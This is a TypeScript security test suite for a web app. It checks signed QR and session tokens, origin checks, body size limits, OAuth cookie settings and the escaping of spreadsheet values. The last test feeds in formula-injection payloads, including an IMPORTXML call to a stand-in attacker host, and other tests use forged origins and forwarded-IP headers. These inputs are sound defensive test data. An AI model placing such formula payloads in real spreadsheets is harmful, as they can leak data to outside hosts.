import assert from "node:assert/strict";
import { createHmac } from "node:crypto";
import { readFileSync } from "node:fs";
import { runInNewContext } from "node:vm";
import test from "node:test";
import { NextRequest } from "next/server";
import { SignJWT } from "jose";
import { generateQrToken, verifyQrToken, isValidQrTokenFormat } from "../app/lib/qrToken";
import { createSessionToken, verifySessionToken } from "../app/lib/sessionTokens";
import { isSameOrigin, readJsonBody, RequestBodyError } from "../app/lib/requestSecurity";
import { isValidDateString } from "../lib/shared/date";
import { getClientIp } from "../app/lib/clientIp";
import { GET as startOAuth } from "../app/api/auth/discord/route";

const userId = "123456789012345678";
process.env.QR_SECRET = "qr-test-only-".repeat(4);
process.env.SESSION_SECRET = "session-test-only-".repeat(3);

function signedQr(payload: string): string {
    return `${Buffer.from(payload).toString("base64url")}.${createHmac("sha256", process.env.QR_SECRET!).update(payload).digest("hex")}`;
}

test("QR signatures reject tampering, expiry, future timestamps and malformed signed payloads", () => {
    const token = generateQrToken(userId);
    assert.deepEqual(verifyQrToken(token), { valid: true, userId });
    assert.equal(verifyQrToken(token.slice(0, -1) + (token.endsWith("0") ? "1" : "0")).valid, false);
    assert.equal(verifyQrToken(token + ".extra").valid, false);
    assert.equal(isValidQrTokenFormat("bot-sync-" + userId), false);
    const random = "a".repeat(32);
    for (const payload of [
        `${userId}:${Date.now() - 31 * 86400000}:${random}`,
        `${userId}:${Date.now() + 86400000}:${random}`,
        `invalid:${Date.now()}:${random}`,
        `${userId}:${Date.now()}junk:${random}`,
        `${userId}:${Date.now()}:${random}:extra`,
    ]) assert.equal(verifyQrToken(signedQr(payload)).valid, false);
});

test("Session verification binds algorithm, issuer, audience, age and user ID", async () => {
    assert.equal(await verifySessionToken(await createSessionToken(userId)), userId);
    const key = new TextEncoder().encode(process.env.SESSION_SECRET!);
    const sign = (id: unknown, issuer = "ajmun-x", audience = "ajmun-x-web", alg = "HS256", age = 0) =>
        new SignJWT({ userId: id }).setProtectedHeader({ alg }).setIssuer(issuer).setAudience(audience)
            .setIssuedAt(Math.floor(Date.now() / 1000) - age).setExpirationTime("1h").sign(key);
    for (const token of [
        await sign(userId, "other"), await sign(userId, "ajmun-x", "other"),
        await sign(userId, "ajmun-x", "ajmun-x-web", "HS384"),
        await sign(userId, "ajmun-x", "ajmun-x-web", "HS256", 8 * 86400),
        await sign({ injected: true }), await sign("invalid"), "invalid.jwt.token",
    ]) assert.equal(await verifySessionToken(token), null);
});

test("Cookie writes reject missing, foreign and null origins and missing production configuration", () => {
    const oldUrl = process.env.NEXT_PUBLIC_BASE_URL;
    const oldMode = process.env.NODE_ENV;
    try {
        Object.assign(process.env, { NEXT_PUBLIC_BASE_URL: "https://app.example", NODE_ENV: "production" });
        for (const origin of [undefined, "null", "https://evil.example", "https://app.example.evil.example"]) {
            assert.equal(isSameOrigin(new NextRequest("https://app.example/api/scan", { headers: origin ? { origin } : {} })), false);
        }
        assert.equal(isSameOrigin(new NextRequest("https://app.example/api/scan", { headers: { origin: "https://app.example" } })), true);
        delete process.env.NEXT_PUBLIC_BASE_URL;
        assert.equal(isSameOrigin(new NextRequest("https://app.example/api/scan", { headers: { origin: "https://app.example" } })), false);
    } finally {
        if (oldUrl === undefined) delete process.env.NEXT_PUBLIC_BASE_URL;
        else process.env.NEXT_PUBLIC_BASE_URL = oldUrl;
        if (oldMode === undefined) Reflect.deleteProperty(process.env, "NODE_ENV");
        else Object.assign(process.env, { NODE_ENV: oldMode });
    }
});

test("JSON reads reject oversized streams without trusting Content-Length", async () => {
    const request = new NextRequest("https://app.example/api/scan", {
        method: "POST", headers: { "content-type": "application/json", "content-length": "1" },
        body: new ReadableStream({ start(controller) { controller.enqueue(new TextEncoder().encode("x".repeat(3000))); controller.close(); } }),
        duplex: "half",
    } as ConstructorParameters<typeof NextRequest>[1]);
    await assert.rejects(readJsonBody(request), (e: unknown) => e instanceof RequestBodyError && e.status === 413);
    const valid = new NextRequest("https://app.example/api/scan", { method: "POST", headers: { "content-type": "application/json" }, body: '{"token":"ok"}' });
    assert.deepEqual(await readJsonBody(valid), { token: "ok" });
    const malformed = new NextRequest("https://app.example/api/scan", { method: "POST", headers: { "content-type": "application/json" }, body: "{" });
    await assert.rejects(readJsonBody(malformed), (e: unknown) => e instanceof RequestBodyError && e.status === 400);
    const wrongType = new NextRequest("https://app.example/api/scan", { method: "POST", body: "token=x" });
    await assert.rejects(readJsonBody(wrongType), (e: unknown) => e instanceof RequestBodyError && e.status === 415);
});

test("Calendar validation rejects rollover dates", () => {
    assert.equal(isValidDateString("2024-02-29"), true);
    for (const date of ["2026-02-29", "2026-02-31", "2026-13-01", "2026-1-01", ""]) assert.equal(isValidDateString(date), false);
});

test("Client IP extraction validates the final trusted proxy value", () => {
    assert.equal(getClientIp(new NextRequest("https://app.example", { headers: { "x-forwarded-for": "forged, 203.0.113.10" } })), "203.0.113.10");
    assert.equal(getClientIp(new NextRequest("https://app.example", { headers: { "x-forwarded-for": "invalid" } })), "unknown");
    assert.equal(getClientIp(new NextRequest("https://app.example", { headers: { "x-real-ip": "2001:db8::1" } })), "2001:db8::1");
});

test("OAuth start uses a host-only secure state cookie and limits unauthenticated requests", async () => {
    const oldId = process.env.DISCORD_CLIENT_ID;
    const oldRedirect = process.env.DISCORD_REDIRECT_URI;
    try {
        process.env.DISCORD_CLIENT_ID = userId;
        process.env.DISCORD_REDIRECT_URI = "https://app.example/api/auth/discord/callback";
        const request = () => new NextRequest("https://app.example/api/auth/discord?mode=url", { headers: { "x-forwarded-for": "203.0.113.200" } });
        const response = await startOAuth(request());
        const cookie = response.headers.get("set-cookie")!;
        assert.match(cookie, /__Host-discord_oauth_state=/);
        assert.match(cookie, /Path=\//);
        assert.match(cookie, /Secure/i);
        assert.match(cookie, /HttpOnly/i);
        assert.doesNotMatch(cookie, /Domain=/i);
        const { url } = await response.json();
        assert.equal(new URL(url).searchParams.get("scope"), "identify");
        for (let i = 1; i < 10; i++) assert.equal((await startOAuth(request())).status, 200);
        assert.equal((await startOAuth(request())).status, 429);
    } finally {
        if (oldId === undefined) delete process.env.DISCORD_CLIENT_ID;
        else process.env.DISCORD_CLIENT_ID = oldId;
        if (oldRedirect === undefined) delete process.env.DISCORD_REDIRECT_URI;
        else process.env.DISCORD_REDIRECT_URI = oldRedirect;
    }
});

test("Google Sheets imports prevent formulas from user-controlled cells", () => {
    const source = readFileSync(new URL("../docs/google-sheets-sync.js", import.meta.url), "utf8");
    const safe = runInNewContext(source + "\nsafeSheetValue;") as (value: unknown) => unknown;
    for (const value of ['=IMPORTXML("https://evil.example", "//x")', " +1", "\t=1", "@SUM(1)", "-2"]) assert.equal(safe(value), "'" + value);
    for (const value of ["参加者", "123456789012345678", 42, null]) assert.equal(safe(value), value);
});
